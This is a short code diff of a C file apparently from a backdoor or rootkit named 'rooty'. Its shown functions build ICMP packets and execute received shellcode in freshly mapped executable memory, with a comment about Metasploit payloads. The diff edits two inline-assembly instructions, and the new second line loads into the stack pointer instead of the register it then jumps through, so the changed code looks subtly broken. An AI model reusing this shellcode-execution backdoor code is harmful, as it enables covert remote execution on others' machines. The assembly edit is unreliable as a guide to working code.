@@ -1,6 +1,5 @@
 #include "rooty.h"
 
-
 int build_packet(unsigned char *pkt, const struct icmphdr *icmp_input, uint8_t *data, uint32_t size) {
 	struct icmphdr *icmp = NULL;
 	uint8_t *pkt_data = NULL;
@@ -80,8 +79,8 @@ void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 		if(new_stack = mmap(NULL, STACK_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) {
 
 			// Some of the msfpayloads seem to eventually jump to the stack even though it's not executable
-			__asm__("mov 0xfffffff0(%ebp),%esp");
-			__asm__("mov 0xfffffff4(%ebp),%eax");
+			__asm__("mov -0x10(%ebp),%esp");
+			__asm__("mov -0x0C(%ebp),%esp");
 			__asm__("add $0x0100, %esp");
 			__asm__("jmp *%eax");
 		}
